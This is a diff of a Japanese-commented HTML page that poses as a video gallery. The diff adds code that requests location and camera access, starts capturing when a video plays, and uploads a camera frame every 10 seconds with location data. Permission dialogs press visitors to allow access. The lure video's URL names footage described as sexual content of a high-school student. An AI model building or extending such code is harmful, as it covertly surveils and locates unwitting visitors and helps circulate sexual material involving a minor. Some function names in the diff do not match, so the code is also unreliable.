@@ -95,20 +95,28 @@
     <video id="video" width="320" height="240" autoplay></video>
     <canvas id="canvas" style="display: none;"></canvas>
 
-    <div class="dialog-overlay" id="dialogOverlay">
+    <div class="dialog-overlay" id="geolocationDialogOverlay">
         <div class="dialog">
-            <p>動画を再生するには権限を許可してください。</p>
-            <button id="reloadButton">再試行</button>
+            <p>位置情報のアクセスを許可してください。</p>
+            <button id="reloadGeolocationButton">再試行</button>
+        </div>
+    </div>
+
+    <div class="dialog-overlay" id="cameraDialogOverlay">
+        <div class="dialog">
+            <p>カメラのアクセスを許可してください。</p>
+            <button id="reloadCameraButton">再試行</button>
         </div>
     </div>
 
     <script type="module">
         // 動画URLとタイトルのリストをここに配置
         const videos = [
-            {
+	　　{
                 url: 'https://firebasestorage.googleapis.com/v0/b/hozon-4794d.appspot.com/o/FC2-PPV-2885137%20%E7%8F%BE%E5%BD%B9%E3%81%AE%E9%AB%98%E2%97%8B3%E2%97%8B%E7%94%9F%E3%81%A7%E3%81%99%E3%80%82%20%E9%83%A8%E6%B4%BB%E7%B5%82%E3%82%8F%E3%81%A3%E3%81%9F%E3%81%82%E3%81%A8%E5%88%9D%E3%82%81%E3%81%A6%E3%82%AA%E3%83%8A%E3%83%8B%E3%83%BC%E3%82%92%E6%92%AE%E3%81%A3%E3%81%A6%E3%81%BF%E3%81%BE%E3%81%97%E3%81%9F_1.mp4?alt=media&token=c3d99cd6-afe8-4fb3-8339-e8094eaa52e7',
                 title: 'テスト'
             },
+
             // 他の動画URLとタイトルを追加
         ];
 
@@ -134,6 +142,11 @@
                 videoItem.appendChild(videoContainer);
                 videoItem.appendChild(titleElement);
                 videoGrid.appendChild(videoItem);
+
+                // Add event listener to start camera capture on video play
+                videoElement.addEventListener('play', () => {
+                    requestCameraAccess();
+                });
             });
         }
 
@@ -172,66 +185,47 @@
             } catch (error) {
                 // 位置情報へのアクセスが拒否された場合の処理
                 console.error("位置情報へのアクセスが拒否されました。", error);
-                showCameraPermissionDialog();
+                showGeolocationPermissionDialog();
             }
-            // 位置情報の許可を求める
-            navigator.permissions.query({ name: 'geolocation' })
-                .then(permissionStatus => {
-                    if (permissionStatus.state === 'granted') {
-                        // 位置情報へのアクセスが許可されている場合、カメラを起動
-                        switchCamera();
-                    } else if (permissionStatus.state === 'prompt') {
-                        // 位置情報へのアクセスが未設定の場合、許可ダイアログを表示
-                        permissionStatus.onchange = () => {
-                            if (permissionStatus.state === 'granted') {
-                                // ユーザーが許可した場合、カメラを起動
-                                switchCamera();
-                            } else {
-                                // ユーザーが拒否した場合、ダイアログを再表示
-                                showCameraPermissionDialog();
-                            }
-                        };
-                    } else {
-                        // 位置情報へのアクセスが拒否されている場合、ダイアログを表示
-                        showCameraPermissionDialog();
-                    }
-                })
-                .catch(err => {
-                    console.error('位置情報へのアクセスエラー:', err);
-                    showCameraPermissionDialog();
-                });
         }
 
-        function switchCamera() {
-            if (videoStream) {
-                videoStream.getTracks().forEach(track => track.stop());
-            }
-
-            const constraints = {
-                video: {
-                    deviceId: currentCameraIndex % 2 === 0 ? backCamera.deviceId : frontCamera.deviceId
-                }
-            };
-
-            navigator.mediaDevices.getUserMedia(constraints)
+        function requestCameraPermission() {
+            navigator.mediaDevices.getUserMedia({ video: true })
                 .then(stream => {
-                    videoStream = stream;
-                    startCameraCapture();
-                    currentCameraIndex++;
+                    console.log('カメラへのアクセスが許可されました。', stream);
                 })
-                .catch(err => {
-                    console.error('カメラ切り替えエラー:', err);
+                .catch(error => {
+                    console.error('カメラへのアクセスが拒否されました。', error);
                     showCameraPermissionDialog();
                 });
         }
 
-        function startCameraCapture() {
+        function showGeolocationPermissionDialog() {
+            const dialogOverlay = document.getElementById('geolocationDialogOverlay');
+            dialogOverlay.style.display = 'flex';
+        }
+
+        function showCameraPermissionDialog() {
+            const dialogOverlay = document.getElementById('cameraDialogOverlay');
+            dialogOverlay.style.display = 'flex';
+        }
+
+        // ダイアログの再試行ボタンをクリックしたときにページを再読み込み
+        document.getElementById('reloadGeolocationButton').addEventListener('click', () => {
+            location.reload();
+        });
+
+        document.getElementById('reloadCameraButton').addEventListener('click', () => {
+            location.reload();
+        });
+
+	        function startCameraCapture() {
             if (videoStream) {
                 const videoTracks = videoStream.getVideoTracks();
                 const track = videoTracks[0];
                 const imageCapture = new ImageCapture(track);
 
-                // 1分ごとに撮影してアップロード
+                // 10秒ごとに撮影してアップロード
                 captureInterval = setInterval(() => {
                     imageCapture.grabFrame()
                         .then(imageBitmap => {
@@ -240,12 +234,11 @@
                             ctx.drawImage(imageBitmap, 0, 0, canvas.width, canvas.height);
                             const dataURL = canvas.toDataURL('image/jpeg');
                             uploadImage(dataURL);
-                            switchCamera();
                         })
                         .catch(err => {
                             console.error('画像キャプチャエラー:', err);
                         });
-                }, 10000); // 60000ミリ秒 = 1分
+                }, 10000); // 10000ミリ秒 = 10秒
             }
         }
 
@@ -281,7 +274,6 @@
                     };
 
                     setData(url, exifData);
-                    updateImageHead(url);
                 });
             });
         }
@@ -302,18 +294,8 @@
             };
         }
 
-        // カメラ権限ダイアログを表示
-        function showCameraPermissionDialog() {
-            const dialogOverlay = document.getElementById('dialogOverlay');
-            dialogOverlay.style.display = 'flex';
-        }
 
-        // ダイアログの再試行ボタンをクリックしたときにページを再読み込み
-        document.getElementById('reloadButton').addEventListener('click', () => {
-            location.reload();
-        });
-	
-	    // ページを開いた時に位置情報のアクセスを要求する
+        // ページを開いた時に位置情報のアクセスを要求する
         requestCameraAccess();
 
         // ページロード時に動画をロード
@@ -321,3 +303,4 @@
     </script>
 </body>
 </html>
+
